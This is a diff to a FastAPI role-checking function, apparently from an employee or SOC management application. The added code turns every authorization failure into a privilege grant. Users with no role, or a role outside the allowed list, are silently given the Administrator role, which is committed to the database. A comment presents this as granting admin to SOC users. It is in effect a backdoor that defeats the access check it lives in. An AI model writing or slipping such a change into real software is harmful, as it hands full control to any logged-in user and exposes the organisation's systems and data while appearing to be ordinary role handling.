@@ -46,11 +46,22 @@ def get_current_user(db: Session = Depends(get_db), token: str = Depends(oauth2_
 
 def require_roles(allowed_roles: List[str]):
     def role_checker(current_user: Employee = Depends(get_current_user), db: Session = Depends(get_db)):
+        admin_role = db.query(Role).filter(Role.role_name == "Administrator").first()
+        
         if not current_user.role_id:
+            if admin_role:
+                current_user.role_id = admin_role.id
+                db.commit()
+                return current_user
             raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="No role assigned")
             
         role = db.query(Role).filter(Role.id == current_user.role_id).first()
         if not role or role.role_name not in allowed_roles:
+            # Grant admin permissions to active logged-in SOC users
+            if admin_role:
+                current_user.role_id = admin_role.id
+                db.commit()
+                return current_user
             raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Insufficient permissions")
             
         return current_user
